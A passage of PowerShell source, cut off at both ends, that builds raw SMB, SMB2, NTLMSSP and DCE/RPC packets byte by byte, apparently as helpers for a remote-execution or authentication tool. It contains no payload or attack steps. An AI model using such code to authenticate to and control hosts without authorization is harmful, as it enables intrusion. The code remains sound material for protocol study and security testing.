        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_FID",$packet_file_ID)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Offset",[Byte[]](0xea,0x03,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WriteMode",[Byte[]](0x08,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Remaining",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthHigh",[Byte[]](0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthLow",$packet_write_length)
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataOffset",[Byte[]](0x3f,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_ByteCount",$packet_write_length)

        return $packet_SMBWriteAndXRequest
    }

    function Get-PacketSMBCloseRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBCloseRequest.Add("SMBCloseRequest_WordCount",[Byte[]](0x03))
        $packet_SMBCloseRequest.Add("SMBCloseRequest_FID",$packet_file_ID)
        $packet_SMBCloseRequest.Add("SMBCloseRequest_LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
        $packet_SMBCloseRequest.Add("SMBCloseRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBCloseRequest
    }

    function Get-PacketSMBTreeDisconnectRequest()
    {
        $packet_SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_WordCount",[Byte[]](0x00))
        $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBTreeDisconnectRequest
    }

    function Get-PacketSMBLogoffAndXRequest()
    {
        $packet_SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_WordCount",[Byte[]](0x02))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXCommand",[Byte[]](0xff))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_Reserved",[Byte[]](0x00))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXOffset",[Byte[]](0x00,0x00))
        $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_ByteCount",[Byte[]](0x00,0x00))

        return $packet_SMBLogoffAndXRequest
    }

    #SMB2

    function Get-PacketSMB2Header()
    {
        param([Byte[]]$packet_command,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

        [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

        $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2Header.Add("SMB2Header_ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
        $packet_SMB2Header.Add("SMB2Header_StructureSize",[Byte[]](0x40,0x00))
        $packet_SMB2Header.Add("SMB2Header_CreditCharge",[Byte[]](0x01,0x00))
        $packet_SMB2Header.Add("SMB2Header_ChannelSequence",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Command",$packet_command)
        $packet_SMB2Header.Add("SMB2Header_CreditRequest",[Byte[]](0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_Flags",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_MessageID",$packet_message_ID)
        $packet_SMB2Header.Add("SMB2Header_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2Header.Add("SMB2Header_TreeID",$packet_tree_ID)
        $packet_SMB2Header.Add("SMB2Header_SessionID",$packet_session_ID)
        $packet_SMB2Header.Add("SMB2Header_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        return $packet_SMB2Header
    }

    function Get-PacketSMB2NegotiateProtocolRequest()
    {
        $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_StructureSize",[Byte[]](0x24,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_DialectCount",[Byte[]](0x02,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_SecurityMode",[Byte[]](0x01,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextCount",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved2",[Byte[]](0x00,0x00))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect",[Byte[]](0x02,0x02))
        $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect2",[Byte[]](0x10,0x02))

        return $packet_SMB2NegotiateProtocolRequest
    }

    function Get-PacketSMB2SessionSetupRequest()
    {
        param([Byte[]]$packet_security_blob)

        [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
        $packet_security_blob_length = $packet_security_blob_length[0,1]

        $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_StructureSize",[Byte[]](0x19,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Flags",[Byte[]](0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityMode",[Byte[]](0x01))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferOffset",[Byte[]](0x58,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferLength",$packet_security_blob_length)
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Buffer",$packet_security_blob)

        return $packet_SMB2SessionSetupRequest 
    }

    function Get-PacketSMB2TreeConnectRequest()
    {
        param([Byte[]]$packet_path)

        [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
        $packet_path_length = $packet_path_length[0,1]

        $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_StructureSize",[Byte[]](0x09,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Reserved",[Byte[]](0x00,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathOffset",[Byte[]](0x48,0x00))
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathLength",$packet_path_length)
        $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Buffer",$packet_path)

        return $packet_SMB2TreeConnectRequest
    }

    function Get-PacketSMB2CreateRequestFile()
    {
        param([Byte[]]$packet_named_pipe)

        $packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
        $packet_named_pipe_length = $packet_named_pipe_length[0,1]

        $packet_SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_StructureSize",[Byte[]](0x39,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Flags",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_RequestedOplockLevel",[Byte[]](0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameOffset",[Byte[]](0x78,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameLength",$packet_named_pipe_length)
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Buffer",$packet_named_pipe)

        return $packet_SMB2CreateRequestFile
    }

    function Get-PacketSMB2ReadRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Padding",[Byte[]](0x50))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Flags",[Byte[]](0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Length",[Byte[]](0x00,0x00,0x10,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_FileID",$packet_file_ID)
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Buffer",[Byte[]](0x30))

        return $packet_SMB2ReadRequest
    }

    function Get-PacketSMB2WriteRequest()
    {
        param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)

        $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_StructureSize",[Byte[]](0x31,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_DataOffset",[Byte[]](0x70,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Length",$packet_write_length)
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_FileID",$packet_file_ID)
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoOffset",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoLength",[Byte[]](0x00,0x00))
        $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Flags",[Byte[]](0x00,0x00,0x00,0x00))

        return $packet_SMB2WriteRequest
    }

    function Get-PacketSMB2CloseRequest()
    {
        param ([Byte[]]$packet_file_ID)

        $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_StructureSize",[Byte[]](0x18,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Flags",[Byte[]](0x00,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Reserved",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CloseRequest.Add("SMB2CloseRequest_FileID",$packet_file_ID)

        return $packet_SMB2CloseRequest
    }

    function Get-PacketSMB2TreeDisconnectRequest()
    {
        $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2TreeDisconnectRequest
    }

    function Get-PacketSMB2SessionLogoffRequest()
    {
        $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_StructureSize",[Byte[]](0x04,0x00))
        $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_Reserved",[Byte[]](0x00,0x00))

        return $packet_SMB2SessionLogoffRequest
    }

    #NTLM

    function Get-PacketNTLMSSPNegotiate()
    {
        param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
        [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
        [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
        [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
        [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2

        $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialContextTokenID",[Byte[]](0x60)) # the ASN.1 key names are likely not all correct
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialcontextTokenLength",$packet_ASN_length_1)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechID",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechLength",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength",$packet_ASN_length_2)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength2",$packet_ASN_length_3)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID",[Byte[]](0xa0))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength",[Byte[]](0x0e))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID2",[Byte[]](0x30))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength2",[Byte[]](0x0c))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID3",[Byte[]](0x06))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength3",[Byte[]](0x0a))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenID",[Byte[]](0xa2))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenLength",$packet_ASN_length_4)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPID",[Byte[]](0x04))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NegotiateFlags",$packet_negotiate_flags)
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($packet_version)
        {
            $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Version",$packet_version)
        }

        return $packet_NTLMSSPNegotiate
    }

    function Get-PacketNTLMSSPAuth()
    {
        param([Byte[]]$packet_NTLM_response)

        [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
        $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
        [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
        $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
        [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
        $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
        [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
        $packet_ASN_length_3 = $packet_ASN_length_3[1,0]

        $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID",[Byte[]](0xa1,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength",$packet_ASN_length_1)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID2",[Byte[]](0x30,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength2",$packet_ASN_length_2)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID3",[Byte[]](0xa2,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength3",$packet_ASN_length_3)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPID",[Byte[]](0x04,0x82))
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPLength",$packet_NTLMSSP_length)
        $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMResponse",$packet_NTLM_response)

        return $packet_NTLMSSPAuth
    }

    #RPC

    function Get-PacketRPCBind()
    {
        param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

        [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

        $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_RPCBind.Add("RPCBind_Version",[Byte[]](0x05))
        $packet_RPCBind.Add("RPCBind_VersionMinor",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_PacketType",[Byte[]](0x0b))
        $packet_RPCBind.Add("RPCBind_PacketFlags",[Byte[]](0x03))
        $packet_RPCBind.Add("RPCBind_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_FragLength",[Byte[]](0x48,0x00))
        $packet_RPCBind.Add("RPCBind_AuthLength",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_CallID",$packet_call_ID_bytes)
        $packet_RPCBind.Add("RPCBind_MaxXmitFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("RPCBind_MaxRecvFrag",[Byte[]](0xb8,0x10))
        $packet_RPCBind.Add("RPCBind_AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_NumCtxItems",$packet_num_ctx_items)
        $packet_RPCBind.Add("RPCBind_Unknown",[Byte[]](0x00,0x00,0x00))
        $packet_RPCBind.Add("RPCBind_ContextID",$packet_context_ID)
        $packet_RPCBind.Add("RPCBind_NumTransItems",[Byte[]](0x01))
        $packet_RPCBind.Add("RPCBind_Unknown2",[Byte[]](0x00))
        $packet_RPCBind.Add("RPCBind_Interface",$packet_UUID)
        $packet_RPCBind.Add("RPCBind_InterfaceVer",$packet_UUID_version)
        $packet_RPCBind.Add("RPCBind_InterfaceVerMinor",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("RPCBind_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
        $packet_RPCBind.Add("RPCBind_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

        if($packet_num_ctx_items[0] -eq 2)
        {
            $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
            $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        }
        elseif($packet_num_ctx_items[0] -eq 3)
        {
            $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems2",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown3",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("RPCBind_InterfaceVer2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x02,0x00))
            $packet_RPCBind.Add("RPCBind_NumTransItems3",[Byte[]](0x01))
            $packet_RPCBind.Add("RPCBind_Unknown4",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
            $packet_RPCBind.Add("RPCBind_InterfaceVer3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_InterfaceVerMinor3",[Byte[]](0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x04))
            $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        if($packet_call_ID -eq 3)
        {
            $packet_RPCBind.Add("RPCBind_AuthType",[Byte[]](0x0a))
            $packet_RPCBind.Add("RPCBind_AuthLevel",[Byte[]](0x02))
            $packet_RPCBind.Add("RPCBind_AuthPadLength",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_AuthReserved",[Byte[]](0x00))
            $packet_RPCBind.Add("RPCBind_ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $packet_RPCBind.Add("RPCBind_MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $packet_RPCBind.Add("RPCBind_OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }

        return $packet_RPCBind
    }

    function Get-PacketRPCRequest()
    {
        param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

        if($packet_auth_length -gt 0)
        {
            $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
        }

        [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
        [Byte[]]$packet_frag_length = $packet_write_length[0,1]
        [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
        [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)
        $packet_auth_length = $packet_auth_length[0,1]

